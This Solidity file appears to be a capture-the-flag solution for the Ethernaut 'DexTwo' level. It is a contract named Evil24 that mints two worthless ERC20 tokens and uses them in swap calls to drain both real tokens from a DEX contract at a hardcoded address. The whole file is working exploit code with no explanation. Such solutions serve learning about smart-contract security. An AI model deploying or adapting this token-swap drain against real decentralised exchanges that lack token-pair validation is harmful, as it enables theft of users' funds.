// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {DexTwo} from "./DexTwo.sol";

contract SampleERC20 is ERC20 {
    constructor(address t) ERC20("SampleERC20", "SERC20") {
        _mint(t, 1);
        _mint(msg.sender, 1);
    }
}

contract Evil24 {
    DexTwo target = DexTwo(0x186e0043f9Ef011f1bB262B793A4fF4C66B44265);

    ERC20 a;
    ERC20 b;

    constructor() {
        a = new SampleERC20(address(target));
        b = new SampleERC20(address(target));

        a.approve(address(target), 1);
        b.approve(address(target), 1);
    }

    function pwn() external {
        target.swap(address(a), target.token1(), 1);
        target.swap(address(b), target.token2(), 1);
    }
}
